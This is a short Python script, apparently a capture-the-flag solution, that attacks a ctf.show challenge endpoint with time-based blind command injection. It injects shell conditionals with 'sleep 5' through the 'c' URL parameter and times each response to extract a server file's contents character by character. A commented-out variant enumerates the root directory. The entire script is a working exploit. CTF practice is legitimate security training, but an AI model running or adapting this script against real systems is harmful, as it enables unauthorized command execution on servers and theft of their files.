#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
import time as t
from urllib.parse import quote as urlen

url = 'http://c62bea36-031d-445c-8110-7a61fc99a8a0.challenge.ctf.show/?c='
alphabet = ['{', '}', '.', '/', '@', '-', '_', '=', 'a', 'b', 'c', 'd', 'e', 'f', 'j', 'h', 'i', 'g', 'k', 'l', 'm',
            'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
            'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2',
            '3', '4', '5', '6', '7', '8', '9']

result = ''
for i in range(1, 100):
    for char in alphabet:
        # payload = "if [ ` ls / | awk 'NR==4'  |cut -c{}` = '{}' ];then sleep 5;fi".format(i,char) #flag.php
        payload = "if [ `cat /f149_15_h3r3 | awk 'NR==1' |cut -c{}` = '{}' ];then sleep 5;fi".format(i, char)
        # data = {'cmd':payload}
        try:
            start = int(t.time())
            r = requests.get(url + payload)
            # r = requests.post(url, data=data)
            end = int(t.time()) - start
            # print(i,char)
            if end >= 3:
                result += char
                print("Flag: " + result)
                break
        except Exception as e:
            print(e)
